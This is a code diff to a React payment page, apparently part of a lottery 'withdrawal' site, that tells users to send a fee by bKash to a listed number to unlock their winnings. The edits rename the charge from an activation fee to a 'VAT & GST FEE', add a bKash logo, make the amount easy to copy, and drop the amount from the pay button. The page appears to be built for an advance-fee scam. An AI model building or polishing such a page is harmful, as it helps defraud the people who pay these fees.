@@ -13,12 +13,13 @@ export default function FeePaymentPage() {
 
   const [profile, setProfile] = useState<any>(null);
   const [settings, setSettings] = useState<any>(null);
-  const [loading, setLoading] = useState(true); // লোডিং স্টেট
+  const [loading, setLoading] = useState(true);
 
   const [trxId, setTrxId] = useState("");
   const [submitting, setSubmitting] = useState(false);
   const [message, setMessage] = useState({ type: "", text: "" });
   const [copied, setCopied] = useState(false);
+  const [copiedAmount, setCopiedAmount] = useState(false);
 
   useEffect(() => {
     const fetchData = async () => {
@@ -27,7 +28,6 @@ export default function FeePaymentPage() {
         if (user) {
           const { data: profileData } = await supabase.from("profiles").select("*").eq("id", user.id).single();
           if (profileData) {
-            // সিকিউরিটি চেক: যদি আগেই ফি দেওয়া থাকে, তবে তাকে ফর্ম পেজে পাঠিয়ে দাও
             if (profileData.is_lottery_fee_paid) {
               router.replace("/Lottery/Secure-cashout-activity");
               return;
@@ -70,9 +70,17 @@ export default function FeePaymentPage() {
 
   const totalFeeAmount = mgmtAmount + srvcAmount + netAmount + vatAmount + gstAmount;
 
+  // অ্যামাউন্ট কপি লজিক
+  const copyAmountToClipboard = () => {
+    navigator.clipboard.writeText(totalFeeAmount.toFixed(2));
+    setCopiedAmount(true);
+    setTimeout(() => setCopiedAmount(false), 2000);
+  };
+
   const handleSubmitFee = async () => {
-    if (trxId.length < 6) {
-      setMessage({ type: "error", text: t("Please enter a valid TrxID.", "সঠিক TrxID দিন।") });
+    // TrxID মিনিমাম ৮ ডিজিট চেক
+    if (trxId.length < 8) {
+      setMessage({ type: "error", text: t("Please enter a valid TrxID (Min 8 characters).", "সঠিক TrxID দিন (কমপক্ষে ৮ ডিজিট)।") });
       return;
     }
 
@@ -102,25 +110,11 @@ export default function FeePaymentPage() {
     }
   };
 
-  // ==========================================
-  // লোডিং স্ক্রিন (ফি ভেরিফিকেশন SVG)
-  // ==========================================
   if (loading) {
     return (
       <div className="min-h-screen bg-[#0d241e] flex flex-col items-center justify-center">
-        {/* ফি ভেরিফিকেশন / ডকুমেন্ট SVG আইকন */}
-        <svg 
-          className="w-12 h-12 text-white animate-spin" 
-          fill="none" 
-          stroke="currentColor" 
-          viewBox="0 0 24 24"
-        >
-          <path 
-            strokeLinecap="round" 
-            strokeLinejoin="round" 
-            strokeWidth={1.5} 
-            d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" 
-          />
+        <svg className="w-12 h-12 text-white animate-spin" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
         </svg>
         <p className="text-white mt-4 font-bold tracking-widest animate-pulse text-[11px]">
           VERIFYING FEE...
@@ -135,13 +129,22 @@ export default function FeePaymentPage() {
 
       <main className="fee-main">
         <div className="fee-box">
-          <h3>{t("Withdrawal Activation Fee", "উত্তোলন অ্যাক্টিভেশন ফি")}</h3>
+          {/* নাম পরিবর্তন করে VAT & GST FEE করা হলো */}
+          <h3>{t("VAT & GST FEE", "ভ্যাট এবং জিএসটি ফি")}</h3>
           <p className="fee-instruction">
             {t("Send the exact amount to the number below to unlock your withdrawal.", "আপনার উত্তোলন আনলক করতে নিচের নাম্বারে সঠিক পরিমাণ পাঠান।")}
           </p>
 
           <div className="number-copy-box">
-            <span>{settings?.fee_payment_number}</span>
+            <div className="flex items-center gap-2">
+               {/* বিকাশ লোগো যুক্ত করা হলো */}
+               <img 
+                 src="https://i.ibb.co.com/ynRH1K3z/file-00000000ee6482089b62b469990f602a.png" 
+                 alt="bKash" 
+                 className="bkash-logo" 
+               />
+               <span>{settings?.fee_payment_number}</span>
+            </div>
             <button onClick={copyNumber} className="copy-btn">
               {copied ? t("Copied!", "কপি!") : t("Copy", "কপি")}
             </button>
@@ -181,7 +184,22 @@ export default function FeePaymentPage() {
             
             <div className="fee-row">
               <span>{t("Total Payable", "মোট প্রদেয়")}</span>
-              <span className="green-text">৳ {totalFeeAmount.toFixed(2)}</span>
+              <div className="flex items-center">
+                <span className="green-text">৳ {totalFeeAmount.toFixed(2)}</span>
+                {/* অ্যামাউন্ট কপি বাটন */}
+                <button onClick={copyAmountToClipboard} className="copy-amount-btn" title="Copy Amount">
+                  {copiedAmount ? (
+                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#00E701" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                       <polyline points="20 6 9 17 4 12"></polyline>
+                     </svg>
+                  ) : (
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                  )}
+                </button>
+              </div>
             </div>
           </div>
 
@@ -206,7 +224,8 @@ export default function FeePaymentPage() {
           disabled={submitting || !trxId || totalFeeAmount <= 0}
           className="submit-btn"
         >
-          {submitting ? t("Processing...", "প্রসেসিং...") : t(`Pay Fee (৳${totalFeeAmount.toFixed(2)})`, `ফি পরিশোধ করুন (৳${totalFeeAmount.toFixed(2)})`)}
+          {/* বাটনে অ্যামাউন্ট দেখানো বন্ধ করা হলো */}
+          {submitting ? t("Processing...", "প্রসেসিং...") : t("Pay Fee", "ফি পরিশোধ করুন")}
         </button>
       </div>
     </div>
